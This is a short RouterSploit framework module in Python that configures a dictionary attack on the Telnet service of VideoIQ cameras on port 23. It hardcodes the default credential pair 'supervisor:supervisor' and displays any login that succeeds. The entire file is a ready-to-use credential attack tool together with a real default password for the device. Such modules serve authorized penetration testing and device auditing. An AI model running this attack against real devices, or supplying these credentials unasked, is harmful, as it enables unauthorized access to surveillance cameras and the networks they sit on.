from routersploit.core.exploit import *
from routersploit.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "VideoIQ Camera Default Telnet Creds",
        "description": "Module performs dictionary attack against VideoIQ Camera Telnet service. "
                       "If valid credentials are found, they ar displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "VideoIQ Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("supervisor:supervisor", "User:Pass or file with default credentials (file://)")
